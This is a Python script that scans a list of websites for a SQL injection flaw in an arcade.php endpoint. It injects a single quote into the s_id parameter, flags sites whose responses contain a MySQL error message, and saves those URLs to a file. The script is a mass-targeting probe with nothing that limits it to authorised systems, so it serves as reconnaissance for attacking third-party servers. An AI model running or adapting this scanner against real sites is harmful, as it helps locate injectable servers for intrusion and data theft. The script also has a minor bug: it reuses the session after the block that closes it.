# Importing the required module
import requests

def arcade_vuln_check(session, base_url):
    """
    Check if a web application is vulnerable to SQL injection.

    Parameters:
    - session (requests.Session): A session object to reuse the underlying TCP connection.
    - base_url (str): The base URL of the web application.

    Returns:
    str: A string indicating whether the web application is vulnerable or not.
    """
    url = f"{base_url}/arcade.php?act=Arcade&do=stats&comment=a&s_id=1'"
    response = session.get(url)
    return f"{url}: {'Vulnerable' if 'mySQL query error' in response.text else 'Not vulnerable'} to SQL Injection"

def main():
    """
    Main function to read base URLs from a file, check for SQL injection vulnerability,
    print the results, and save vulnerable URLs to a file.
    """
    with open("base_urls.txt", "r", encoding="utf-8") as file:
        base_urls = [line.strip() for line in file.readlines()]

    with requests.Session() as session:
        # Using list comprehension to filter vulnerable URLs
        vulnerable_urls = [url for url in base_urls if 'Vulnerable' in arcade_vuln_check(session, url)]

    # Print results
    for result in (arcade_vuln_check(session, url) for url in base_urls):
        print(result)

    # Save vulnerable URLs to a file
    with open("vulnerable.txt", "w", encoding="utf-8") as file:
        file.writelines([f"{url}\n" for url in vulnerable_urls])

if __name__ == "__main__":
    main()
